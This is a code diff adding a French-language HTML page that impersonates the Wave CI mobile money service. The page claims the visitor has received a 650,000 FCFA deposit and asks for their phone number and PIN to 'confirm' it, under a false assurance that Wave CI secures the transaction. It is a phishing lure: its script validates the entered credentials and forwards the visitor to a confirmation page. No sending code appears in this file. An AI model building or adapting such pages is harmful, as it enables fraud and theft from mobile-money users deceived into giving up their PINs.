@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Wave CI - Confirmez votre dépôt</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            background-color: white;
+            box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.2);
+            border-radius: 10px;
+            text-align: center;
+            animation: fadeIn 1s ease-in-out;
+        }
+        img.logo {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            color: #0A84FF;
+            margin-bottom: 10px;
+        }
+        .message {
+            margin-bottom: 20px;
+            font-size: 18px;
+            color: #333;
+            line-height: 1.5;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin: 12px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+            transition: all 0.3s;
+        }
+        input[type="text"]:focus, input[type="password"]:focus {
+            border-color: #0A84FF;
+            box-shadow: 0 0 8px rgba(10, 132, 255, 0.2);
+        }
+        button {
+            width: 100%;
+            background-color: #0A84FF;
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #006bb3;
+        }
+        .error {
+            color: red;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+        .secure-message {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <img src="C:/Users/Administrateur/Downloads/wave.webp" alt="Logo de Wave CI" class="logo">
+        <h1>Wave CI</h1>
+        <p class="message">Vous avez reçu un dépôt de <strong>650 000 FCFA</strong> du numéro +225 ********78.<br>Veuillez entrer vos informations pour confirmer et recevoir le montant.</p>
+
+        <form id="depositForm">
+            <input type="text" id="phone" name="phone" placeholder="Numéro de téléphone (10 chiffres)" required><br>
+            <input type="password" id="pin" name="pin" placeholder="Code PIN (4 chiffres)" required><br>
+            <p class="error" id="error-message"></p>
+            <button type="submit">Confirmer le dépôt</button>
+        </form>
+
+        <p class="secure-message">Cette transaction est sécurisée par Wave CI.</p>
+    </div>
+
+    <script>
+        document.getElementById('depositForm').addEventListener('submit', function(event) {
+            event.preventDefault();  // Empêche la soumission par défaut
+
+            // Récupérer les valeurs des champs
+            var phone = document.getElementById('phone').value;
+            var pin = document.getElementById('pin').value;
+            var errorMessage = document.getElementById('error-message');
+
+            // Réinitialiser le message d'erreur
+            errorMessage.textContent = '';
+
+            // Vérification du numéro de téléphone (10 chiffres)
+            var phoneRegex = /^[0-9]{10}$/;
+            if (!phoneRegex.test(phone)) {
+                errorMessage.textContent = 'Le numéro de téléphone doit comporter exactement 10 chiffres.';
+                return;
+            }
+
+            // Vérification du code PIN (4 chiffres)
+            var pinRegex = /^[0-9]{4}$/;
+            if (!pinRegex.test(pin)) {
+                errorMessage.textContent = 'Le code PIN doit comporter exactement 4 chiffres.';
+                return;
+            }
+
+            // Si tout est correct, rediriger vers la page de confirmation
+            window.location.href = 'confirmation.html';
+        });
+    </script>
+
+</body>
+</html>
